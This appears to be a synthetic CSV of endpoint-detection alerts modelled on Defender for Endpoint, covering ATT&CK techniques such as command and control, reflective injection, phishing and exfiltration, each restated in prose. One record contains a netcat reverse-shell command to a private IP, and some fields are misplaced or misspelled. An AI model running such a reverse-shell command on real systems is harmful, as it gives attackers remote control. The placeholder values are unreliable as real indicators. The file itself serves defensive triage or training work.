AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,combined_data
902405,,2023-03-09T12:00:00.000000Z,,,,Multi-Stage Command and Control,Detection of multi-stage command and control traffic,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k netsvcs,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,svchost.exe,,,,,,1234,5678,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,443,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0902405. AlertTimestamp is 2023-03-09T12:00:00.000000Z. AlertName is Multi-Stage Command and Control. AlertDescription is Detection of multi-stage command and control traffic. ProcessCommandLine is C:\Windows\System32\svchost.exe -k netsvcs. Severity is High. AlertType is Endpoint detection. Tactic is Command and Control. ProcessName is svchost.exe. ParentProcessName is explorer.exe. ParentProcessCommandLine is C:\Windows\explorer.exe. Protocol is TCP. User is DOMAIN\user. SourceIP is 192.168.1.100. DestinationIP is 10.0.0.2. 
pr4p5-f,,,,,,Native API,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,Native API (T1106),,,,,,,,,,,,,,,,,High,,,,,System Call,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is pr4p5-f. AlertName is Native API. AlertDescription is Defender for Endpoint has detected suspicious use of a Native API on the system.. Technique is Native API (T1106). Severity is High. Category is System Call. Recommendation is Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.. Process_Name is explorer.exe. Detection_Details is Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.. Process_Path is C:\Windows\explorer.exe. Process_Command_Line is explorer.exe /root,C:\Windows\system32. "
30340ed0r5,,2023-03-09T12:00:00.000000Z,,,,Non-Application Layer Protocol,Detection of non-application layer protocol traffic,,,,,,,,,,,,C:\Windows\System32\nslookup.exe example.com,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,nslookup.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,UDP,,,,53,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 30340ed0r5. AlertTimestamp is 2023-03-09T12:00:00.000000Z. AlertName is Non-Application Layer Protocol. AlertDescription is Detection of non-application layer protocol traffic. ProcessCommandLine is C:\Windows\System32\nslookup.exe example.com. Severity is High. AlertType is Endpoint detection. Tactic is Command and Control. ProcessName is nslookup.exe. ParentProcessName is cmd.exe. ParentProcessCommandLine is C:\Windows\System32\cmd.exe. Protocol is UDP. User is DOMAIN\user. SourceIP is 192.168.1.100. DestinationIP is 10.0.0.2. 
203040fd,,2023-03-09T12:00:00.000000Z,,,,Non-Standard Port,Detection of network traffic to a non-standard port,,,,,,,,,,,,C:\Program Files\curl\curl.exe https://example.com:12345,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,curl.exe,,,,,,1234,,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,12345,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 203040fd. AlertTimestamp is 2023-03-09T12:00:00.000000Z. AlertName is Non-Standard Port. AlertDescription is Detection of network traffic to a non-standard port. ProcessCommandLine is C:\Program Files\curl\curl.exe https://example.com:12345. Severity is High. AlertType is Endpoint detection. Tactic is Command and Control. ProcessName is curl.exe. ParentProcessName is cmd.exe. ParentProcessCommandLine is C:\Windows\System32\cmd.exe. Protocol is TCP. User is DOMAIN\user. SourceIP is 192.168.1.100. DestinationIP is 10.0.0.2. 
0304054d,,2023-03-10T10:30:00Z,,,,Obfuscated Files,Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.,,,,,,Obfuscated Files or Information,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\Malware\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0304054d. AlertTimestamp is 2023-03-10T10:30:00Z. AlertName is Obfuscated Files. AlertDescription is Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.. Technique is Obfuscated Files or Information. Severity is High. Tactic is Defense Evasion. Recommendation is Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.. AffectedHostname is hostname123. AlertSource is Defender for Endpoint EDR. AffectedFile_Path is C:\Program Files\Malware\malware.exe. 
T1566,,,,,,Potential Phishing Attempt,An email was received with suspicious content and links. The user did not click on any links or respond to the email.,,,,,,,,,,,,,,,,,,,,,,,High,,,Phishing,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,"{'UserName': 'johndoe', 'UserDisplayName': 'John Doe', 'UserEmail': 'johndoe@example.com', 'UserAgent': 'Microsoft Outlook', 'UserIP': '192.168.1.20'}","{'SenderEmail': 'spoofed@example.com', 'RecipientEmail': 'johndoe@example.com', 'Subject': 'Important: Action Required', 'URLs': ['http://malicious.com', 'http://phishing.com'], 'Attachments': ['invoice.pdf']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is T1566. AlertName is Potential Phishing Attempt. AlertDescription is An email was received with suspicious content and links. The user did not click on any links or respond to the email.. Severity is High. AlertType is Phishing. AlertTime is 2023-03-04T13:45:30Z. UserInfo UserName is johndoe. UserInfo UserDisplayName is John Doe. UserInfo UserEmail is johndoe@example.com. UserInfo UserAgent is Microsoft Outlook. UserInfo UserIP is 192.168.1.20. PhishingInfo SenderEmail is spoofed@example.com. PhishingInfo RecipientEmail is johndoe@example.com. PhishingInfo Subject is Important: Action Required. 
3-04-5-ft5,,2023-03-10T12:00:00Z,,,,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,Pre-OS Boot,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 3-04-5-ft5. AlertTimestamp is 2023-03-10T12:00:00Z. AlertName is Pre-OS Boot. AlertDescription is Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.. Technique is Pre-OS Boot. Severity is Critical. Tactic is Persistence. Recommendation is Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.. AffectedHostname is hostname123. AlertSource is Defender for Endpoint EDR. AffectedImagePath is C:\Windows\System32\bootmgr. "
toeodo56,,2023-03-09T15:30:00Z,,,,Protocol Tunneling,Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another.,,,,,,,,,,,,,Network traffic analysis,"['Isolate affected endpoints', 'Investigate network traffic']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']","['192.168.1.10', '10.0.0.2']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is toeodo56. AlertTimestamp is 2023-03-09T15:30:00Z. AlertName is Protocol Tunneling. AlertDescription is Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another.. DetectionMethod is Network traffic analysis. RecommendedActions are Isolate affected endpoints; Investigate network traffic; Severity is High. AlertType is Endpoint detection. AdditionalInfo is Protocol: HTTP over DNS. AffectedEndpoints are Endpoint1; Endpoint2; IndicatorsOfCompromise are 192.168.1.10; 10.0.0.2; 
33440rft,,2023-03-10T15:45:00Z,,,,Reflective Code,.,,,,,,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk",,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 33440rft. AlertTimestamp is 2023-03-10T15:45:00Z. AlertName is Reflective Code. AlertDescription is .. Technique is Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Severity is High. Tactic is Execution. Recommendation is Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.. Affected_Hostname is hostname123. Injected_Process_Name is explorer.exe. Alert_Source is Defender for Endpoint EDR. Loader_Process_Name is notepad.exe. Loader_Technique is Reflective DLL Injection. "
20345q,,2023-03-09T10:30:00Z,,,,Remote Access,Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,nc.exe -e cmd.exe 10.0.0.2 4444,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A2D3F4B5C6E7A8B9,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cmd.exe,B9A8E7C6B5F4D3A2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 20345q. AlertTimestamp is 2023-03-09T10:30:00Z. AlertName is Remote Access. AlertDescription is Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.. ProcessCommandLine is nc.exe -e cmd.exe 10.0.0.2 4444. Severity is High. ProcessName is nc.exe. ProcessPath is C:\Windows\System32\nc.exe. ProcessHash is A2D3F4B5C6E7A8B9. ProcessParentName is cmd.exe. ProcessParentPath is C:\Windows\System32\cmd.exe. ProcessParentHash is B9A8E7C6B5F4D3A2. 
pdpdf03r4,,,,,,Scheduled Task,A new scheduled task/job was created or modified on the system.,,,,,,Scheduled Task/Job,,,,,,,,,,,,,,,,,High,,,,,Malware Persistence,,,,,,,,,,,,Persistence,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,System Process,Task Scheduler,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is pdpdf03r4. AlertName is Scheduled Task. AlertDescription is A new scheduled task/job was created or modified on the system.. Technique is Scheduled Task/Job. Severity is High. Category is Malware Persistence. Tactic is Persistence. IPAddress is 192.168.1.100. EntityType is System Process. EntityName is Task Scheduler. Hostname is DESKTOP-ABC123. Description is Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).. "
iododw0r,,2022-04-01T09:22:14.866Z,,,,Deployment Tool,An instance of a software deployment tool was detected on a system,,,,,,,,,,,,microsoft.deploymentsomething.exe /install /quiet,,,,,,,,,,,High,,,,,,,,,,,,,EDR,,,,,,,,microsoft.deploymentsomething.exe,,,,192.168.0.10,,1234,5678,,,,,,,,,,,,,setup.exe,setup.exe /install,,,,,,,Endpoint,Hostname-01,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,C:\Users\Admin\Downloads\setup.exe,C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is iododw0r. AlertTimestamp is 2022-04-01T09:22:14.866Z. AlertName is Deployment Tool. AlertDescription is An instance of a software deployment tool was detected on a system. ProcessCommandLine is microsoft.deploymentsomething.exe /install /quiet. Severity is High. DetectionSource is EDR. ProcessName is microsoft.deploymentsomething.exe. IPAddress is 192.168.0.10. ParentProcessName is setup.exe. ParentProcessCommandLine is setup.exe /install. EntityType is Endpoint. EntityName is Hostname-01. Vendor is Microsoft Defender for Endpoint. ParentProcessPath is C:\Users\Admin\Downloads\setup.exe. ProcessPath is C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe. 
12345,,2023-03-10T15:30:00Z,,,,Suspicious Trusted Relationship,Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.,,,,,,,,,,,,,Behavior monitoring,,,,,,,,,,High,,,,,Trusted Relationship,,,,,,,,,,,,,,,,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,,,192.168.1.100,,,,,,,,,,,,,,,,services.exe,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC-1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,20H2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\ntdll.dll,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c whoami,Execution,T1199,Trusted Relationship,00:11:22:33:44:55,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 12345. AlertTimestamp is 2023-03-10T15:30:00Z. AlertName is Suspicious Trusted Relationship. AlertDescription is Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.. DetectionMethod is Behavior monitoring. Severity is High. Category is Trusted Relationship. ProcessName is svchost.exe. CommandLine is C:\Windows\system32\svchost.exe -k netsvcs. IPAddress is 192.168.1.100. ParentProcessName is services.exe. OS is Windows 10. Hostname is PC-1234. OSVersion is 20H2. ImageLoaded is C:\Windows\System32\ntdll.dll. TargetImageLoaded is C:\Windows\System32\cmd.exe. TargetImageName is cmd.exe. TargetCommandLine is cmd.exe /c whoami. KillchainPhase is Execution. TechniqueID is T1199. Techniqu is Trusted Relationship. MACAddress is 00:11:22:33:44:55. 
123456789,,2023-03-06T14:30:00Z,,,,Automated Exfiltration,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,Defender for Endpoint,,,,,,,,explorer.exe,explorer.exe C:\Users\user1\Desktop\confidential.docx,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'RuleName': 'Block Exfiltration', 'RuleAction': 'Block', 'RuleID': 12345, 'NetworkProtocol': 'TCP', 'RemoteIP': '10.0.0.2', 'RemotePort': 8080}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,00-11-22-33-44-55,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.",Microsoft-Windows-Windows Firewall With Advanced Security/Firewall,Windows Firewall has blocked an application from accessing the network,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 123456789. AlertTimestamp is 2023-03-06T14:30:00Z. AlertName is Automated Exfiltration. AlertSeverity is High. ComputerName is DESKTOP-ABC123. DetectionSource is Defender for Endpoint. ProcessName is explorer.exe. CommandLine is explorer.exe C:\Users\user1\Desktop\confidential.docx. IPAddress is 192.168.1.100. UserName is user1. AdditionalInfo RuleName is Block Exfiltration. AdditionalInfo RuleAction is Block. AdditionalInfo NetworkProtocol is TCP. AdditionalInfo RemoteIP is 10.0.0.2. MACAddress is 00-11-22-33-44-55. AlertyDescription is Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.. EventLogName is Microsoft-Windows-Windows Firewall With Advanced Security/Firewall. EventLogMessage is Windows Firewall has blocked an application from accessing the network. "
